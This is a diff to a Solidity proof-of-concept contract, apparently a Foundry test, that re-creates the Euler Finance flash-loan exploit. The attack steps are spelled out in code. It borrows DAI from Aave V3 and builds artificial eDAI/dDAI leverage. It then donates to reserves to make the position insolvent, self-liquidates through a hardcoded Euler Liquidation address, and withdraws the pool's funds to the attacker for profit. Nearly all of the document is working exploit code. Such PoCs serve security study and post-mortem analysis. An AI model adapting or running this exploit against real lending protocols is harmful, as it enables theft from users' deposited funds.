@@ -13,19 +13,19 @@ import {Liquidation} from "euler-contracts/modules/Liquidation.sol";
 import {Addresses} from "./libraries/Addresses.sol";
 
 error NotEnoughFunds(uint256 balance, uint256 amount);
+error NotProfitable(uint256 eTokenBalance, uint256 dTokenBalance);
 
 contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test {
 
     Violator private violator;
 
      constructor(
-        IPoolAddressesProvider _addressProvider,
-        address _collateral
+        IPoolAddressesProvider _addressProvider
     ) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider)) {
          violator = new Violator();
      }
 
-    // 1. Flahsloan from AaveV3
+    // 1. call flahsloan on AaveV3
     function callFashLoan(address _tokenAddress, uint256 _amount) external {
        POOL.flashLoanSimple(address(this), _tokenAddress, _amount, "0x", 0);
     }
@@ -35,27 +35,26 @@ contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test {
         address asset,
         uint256 amount,
         uint256 premium,
-        address initiator,
-        bytes calldata params
+        address,
+        bytes calldata
     )
         external
         returns (bool)
     {
-
         IERC20 token = IERC20(asset);
         // 2. Transfer the full loan balance to the violator contract
         token.transfer(address(violator), amount);
 
         // Start the attack using 2/3 of the funds
-        uint256 attackAmount = (amount / 3) * 2;
+        uint256 attackAmount = amount / 3 * 2;
 
         // Call violator and execute attack
         violator.executeAttack(token, attackAmount);
 
-        // Check balance
         uint256 balance = token.balanceOf(address(this));
         uint256 repayAmount = amount + premium;
 
+        // Check if we have enough funds to repay the loan
         if(balance < repayAmount) {
             revert NotEnoughFunds({
                 balance: balance,
@@ -84,8 +83,10 @@ contract Violator {
         // Check DAI balance
         uint256 balance = _token.balanceOf(address(this));
 
-        // minBalance is 150% of _amount since we are using 2/3 for leverage and 1/3 for repaying to decrease dDAI balance
-        uint256 minBalance = (_amount * 3) / 2;
+        // The minBalance is set to 150% of the given _amount.
+        // - 2/3 of the _amount is used for leveraging the position.
+        // - 1/3 of the _amount is used to decrease the dToken balance, effectively repaying part of the debt.
+        uint256 minBalance = _amount * 3 / 2;
 
         // Check if we have enough funds to execute the attack
         if(balance < minBalance) {
@@ -115,17 +116,21 @@ contract Violator {
         // 6. Create another 10x artificial eDAI leverage
         eToken.mint(0, amountLeveraged);
 
-        // 7. Donate half of eDAI (leveraged) balance to the reserve of the eDAI
+        // 7. Donate half of eDAI leveraged balance to the reserve of the eDAI
         eToken.donateToReserves(0, amountLeveraged / 2);
 
         uint256 eTokenBalance = eToken.balanceOfUnderlying(address(this));
         uint256 dTokenBalance = dToken.balanceOf(address(this));
 
-        // violator contains a significantly larger amount of dDAI than eDAI that will never be collateralized
-        assert(dTokenBalance > eTokenBalance);
+        // Violator should contain a significantly larger amount of dDAI than eDAI that will never be collateralized
+        if(dTokenBalance < eTokenBalance) {
+            revert NotProfitable({
+                eTokenBalance: eTokenBalance,
+                dTokenBalance: dTokenBalance
+                });
+        }
 
-        // 8. Liquidate the violator’s position
-        return liquidator.executeLiquidation(msg.sender, _token, address(this));
+        return liquidator.executeLiquidation(msg.sender,  address(this), _token);
     }
 }
 
@@ -133,11 +138,15 @@ contract Violator {
 contract Liquidator {
     Liquidation public constant liquidation = Liquidation(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
 
-    function executeLiquidation(address _attacker, IERC20 _token, address _violator) external {
+    function executeLiquidation(address _attacker, address _violator, IERC20 _token) external {
+        // 8. Liquidate the violator’s position
         Liquidation.LiquidationOpportunity memory liq =  liquidation.checkLiquidation(address(this), _violator, address(_token), address(_token));
         liquidation.liquidate(_violator, address(_token), address(_token), liq.repay, liq.yield-1);
 
+        // Withdraw all funds from Euler
         Addresses.eDAI.withdraw(0, _token.balanceOf(Addresses.EULER));
+
+        // Transfer all funds to the EulerHackPoC contract to repay the loan and keep the profit
         _token.transfer(_attacker, _token.balanceOf(address(this)));
     }
 
